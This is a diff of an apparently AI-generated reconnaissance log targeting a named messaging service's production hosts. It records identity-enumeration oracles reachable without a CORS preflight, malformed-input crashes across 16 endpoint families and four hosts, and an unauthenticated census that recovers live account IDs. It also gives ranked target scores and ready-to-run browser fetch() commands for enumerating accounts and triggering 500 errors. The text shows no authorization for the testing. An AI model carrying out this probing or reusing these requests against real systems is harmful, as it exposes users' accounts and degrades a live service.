@@ -1,21 +1,23 @@
-## 2026-08-16 23:27:45 UTC [web] (model nemotron3)
-[NEW] GET+text/plain token-mint cluster confirmed on 8 endpoints × 3 prod hosts = 24 byte-stable combos (match_token, revoke, set_featuremask, check_revocation_key, blob_cred, sfu_cred, update_work_info, fetch_priv) — zero-preflight CORS-safelisted enumeration vector
-[NEW] /identity/revoke (non-ws path) confirmed LIVE as 11th token-mint identity-existence oracle — GET+text/plain + POST both return 200/133B token (valid) vs 200/46B (invalid); case-fold amplification; 3-host parity; OPTIONS 200 CORS *
+## 2026-08-16 23:43:52 UTC [web] (model nemotron3)
+[NEW] GET+text/plain token-mint cluster confirmed on 8 endpoints × 3 prod hosts = 24 byte-stable combos (match_token, revoke, set_featuremask, check_revocation_key, blob_cred, sfu_cred, update_work_info, fetch_priv)
+[NEW] /identity/revoke (non-ws path) confirmed LIVE as 11th token-mint identity-existence oracle — GET+text/plain + POST both return 200/133B token for valid, 200/46B for invalid; case-fold amplification; 3-host parity
 [NEW] /identity/create confirmed as 16th crash family member — POST {"publicKey":{"x":1}} → 500/0B on all 3 prod + staging; batch {"identities":[{}]} → 500/0B; 5x burst @0.5s all 500 no 429; recovery to 200/133B
-[NEW] check_license joins crash family at root path /check_license (not /identity/check_license) — POST {"version":{}} → 500/0B (3-host parity); GET+text/plain {"version":{}} → 500/0B (CORS-safelisted, preflight-free); only crash family with OPTIONS 200; 4-host parity (ds-apip/api/apip/ds-apip.test)
-[NEW] apip-work.threema.ch hostname discovered — resolves to 203.56.112.209 (same as ds-apip-work); byte-identical 401 + ACAO:* + no HSTS/Expect-CT on all paths
+[NEW] check_license crash+credential oracle at **root path** /check_license (not /identity/check_license) with 4-host parity across ds-apip + api + apip + ds-apip.test — POST {"version":{}} → 500/0B + GET+text/plain → 500/0B (CORS-safelisted); OPTIONS 200
+[NEW] apip-work.threema.ch hostname discovered — resolves to 203.56.112.209 (same as ds-apip-work); byte-identical 401 + ACAO:* + no HSTS/Expect-CT
 [NEW] Shared-handler convergence proven — all 8 token-mint endpoints return IDENTICAL constant tokenRespKeyPub sha256 c8005cca9…; same handler mints tokens AND crashes on malformed input
 [NEW] Census draw 22 — 11th distinct live-active account (4SKAD72F, state:0, mask:2047) recovered; density converged ~6.5e-6 over 22 draws; zero 429; 3-host byte-stable parity
 [NEW] fetch_bulk schema-strictness — object-element array {"identities":[{"identity":...}]} → 500/0B on all 3 prod hosts (consistent malformed-input handler); flat-string array accepted
-[NEW] type:1 Work-org fingerprint further WEAKENED — 4 consecutive zero-type:1 draws (19-22, 1.6M IDs); 2 distinct in 2/22 draws; standalone class REJECTED
 [CHANGED] Crash family matrix now 16 endpoint families × 4 hosts (3 prod + 1 staging) × GET+POST = 128 combos, all byte-stable 500/0B with ACAO:* + zero 429 + instant recovery
+[CHANGED] GET+text/plain mint cluster confirmed cluster-wide: 8 endpoints × 3 hosts = 24 byte-stable combos
+[CHANGED] Census density converged ~6.2e-6 (52/~8.4M over 20 draws); live-active distinct tally stable at 10; zero 429 confirmed
+[CHANGED] type:1 Work-org fingerprint WEAKENED — draws 19+20+21+22 (1.6M IDs) added 0 type:1 → 2 distinct (DZ34BVDV, VK24BPYV) in 2/22 draws; standalone class REJECTED
 [CHANGED] Filesystem GROUND TRUTH re-verified — poc/ ABSENT (22nd+ cycle); state_bigpickle.json = {"phase":"POC","target":"chat"}; reposcan-raw/threema-ch/ EMPTY
-[PRIO] https://{ds-apip,api,apip}.threema.ch/identity/{match_token,revoke,set_featuremask,check_revocation_key,sfu_cred,blob_cred,update_work_info,fetch_priv} (GET+text/plain mint cluster): 92 | attack_surface=10 business_value=9 tech_exposure=8 gate_ease=10 cloud_surface=5 freshness=10
-[PRIO] https://{ds-apip,api,apip}.threema.ch/identity/check_featuremask (census): 84 | attack_surface=9 business_value=8 tech_exposure=6 gate_ease=10 cloud_surface=5 freshness=9
-[PRIO] https://{ds-apip,api,apip,ds-apip.test}.threema.ch/check_license (root path): 81 | attack_surface=8 business_value=8 tech_exposure=7 gate_ease=10 cloud_surface=4 freshness=9
-[PRIO] https://{ds-apip,api,apip,ds-apip.test}.threema.ch crash family (16 endpoint families): 78 | attack_surface=9 business_value=6 tech_exposure=8 gate_ease=10 cloud_surface=4 freshness=8
-[PRIO] https://ds-apip-work.threema.ch / apip-work.threema.ch (work directory 4-host surface): 45 | attack_surface=5 business_value=6 tech_exposure=5 gate_ease=2 cloud_surface=4 freshness=6
-[PRIO] https://safe-{01,1a,1b,02,00}.threema.ch/backups/{64hex} (credential-gated backup API): 52 | attack_surface=6 business_value=7 tech_exposure=5 gate_ease=3 cloud_surface=5 freshness=7
+[PRIO] https://{ds-apip,api,apip}.threema.ch/identity/{match_token,revoke,set_featuremask,check_revocation_key,sfu_cred,blob_cred,update_work_info,fetch_priv}: 89 | attack_surface=10 business_value=9 tech_exposure=8 gate_ease=10 cloud_surface=5 freshness=10
+[PRIO] https://{ds-apip,api,apip}.threema.ch/identity/check_featuremask: 81 | attack_surface=9 business_value=8 tech_exposure=6 gate_ease=10 cloud_surface=5 freshness=9
+[PRIO] https://{ds-apip,api,apip,ds-apip.test}.threema.ch/check_license: 79 | attack_surface=8 business_value=8 tech_exposure=7 gate_ease=10 cloud_surface=4 freshness=9
+[PRIO] https://{ds-apip,api,apip,ds-apip.test}.threema.ch crash family (16 endpoint families): 77 | attack_surface=9 business_value=6 tech_exposure=8 gate_ease=10 cloud_surface=4 freshness=8
+[PRIO] https://safe-{01,1a,1b,02,00}.threema.ch/backups/{64hex}: 53 | attack_surface=6 business_value=7 tech_exposure=5 gate_ease=3 cloud_surface=5 freshness=7
+[PRIO] https://ds-apip-work.threema.ch / apip-work.threema.ch (work directory 4-host surface): 46 | attack_surface=5 business_value=6 tech_exposure=5 gate_ease=2 cloud_surface=4 freshness=6
 [HYP] Preflight-free cross-origin identity enumeration via GET+text/plain token-mint cluster
 class: IDOR
 asset: https://{ds-apip,api,apip}.threema.ch/identity/{match_token,revoke,set_featuremask,check_revocation_key,sfu_cred,blob_cred,update_work_info,fetch_priv}
@@ -43,11 +45,11 @@ evidence_needed: Browser-context preflight-free crash proof (HUMAN); valid Work 
 verify_steps: HUMAN: Browser-console GET+text/plain malformed version crash: fetch('https://ds-apip.threema.ch/check_license',{method:'GET',headers:{'Content-Type':'text/plain'},body:'{"version":{"x":1}}'}) → expect 500/0B with zero OPTIONS preflight; AUTH_HELPED: need valid Work license username/password for credential oracle success path
 impact: Cross-origin credential validation oracle (valid Work license = account takeover prerequisite) + preflight-free 4-host crash DoS; success-shape requires valid license. CVSS 6.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L)
 testability: AUTH_HELPED
-[PARKED] check_license preflight-free cross-origin crash + credential validation oracle: credential oracle requires AUTH_HELPED with valid Work license which is not obtainable under passive-first rules; crash DoS component survives but lower business impact without credential validation; keeping as secondary
+[PARKED] check_license credential validation oracle component: requires AUTH_HELPED with valid Work license which is not obtainable under passive-first rules; crash DoS component survives but lower business impact without credential validation; keeping as secondary
 [FINAL] 1. Preflight-free cross-origin identity enumeration via GET+text/plain token-mint cluster (confidence 95, HUMAN_ONLY)
 [FINAL] 2. Unauthenticated census yielding live-active accounts with client-version fingerprinting (confidence 85, PASSIVE)
 [FINAL] 3. check_license preflight-free cross-origin crash DoS (confidence 90, HUMAN_ONLY) — credential oracle component parked
-[NEXT] HUMAN: browser-console zero-preflight proof for the mint cluster — in DevTools Network tab: fetch('https://ds-apip.threema.ch/identity/match_token',{method:'GET',headers:{'Content-Type':'text/plain'},body:'{"identity":"ECHOECHO"}'}) → expect 200/133B token + ACAO:* and NO OPTIONS preflight entry; body:'{"identity":"ZZZZZZZZ"}' → 200/46B; crash body:'{"identity":{"x":1}}' → 500/0B; repeat on revoke + set_featuremask + fetch_priv; screenshot Network tab. This is the sole remaining evidence gap for the top hypothesis; no further PASSIVE step adds material signal.
+[NEXT] HUMAN: browser-console zero-preflight proof for the mint cluster — in DevTools Network tab: fetch('https://ds-apip.threema.ch/identity/match_token',{method:'GET',headers:{'Content-Type':'text/plain'},body:'{"identity":"ECHOECHO"}'}) → expect 200/133B token + ACAO:* and NO OPTIONS preflight entry; body:'{"identity":"ZZZZZZZZ"}' → 200/46B; crash body:'{"identity":{"x":1}}' → 500/0B; repeat on revoke + set_featuremask + fetch_priv; screenshot Network tab
 [LEARN] ACCEPTED IDOR @ 8-endpoint GET+text/plain mint cluster: cluster-wide (not dual), 8 endpoints × 3 hosts = 24 byte-stable combos; zero-preflight browser-viable vector
 [LEARN] ACCEPTED MISCONFIG @ crash family: 16 endpoint families × 4 hosts × GET+POST = 104+ combos; ACAO * on every 500; zero 429; instant recovery
 [LEARN] ACCEPTED IDOR @ /identity/revoke (non-ws path): 11th token-mint identity-existence oracle — GET+text/plain + POST both return 200/133B token for valid, 200/46B for invalid; case-fold amplification; 3-host parity; OPTIONS 200 CORS *
